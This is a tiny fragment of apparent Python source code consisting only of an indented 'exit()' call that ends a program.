	exit()
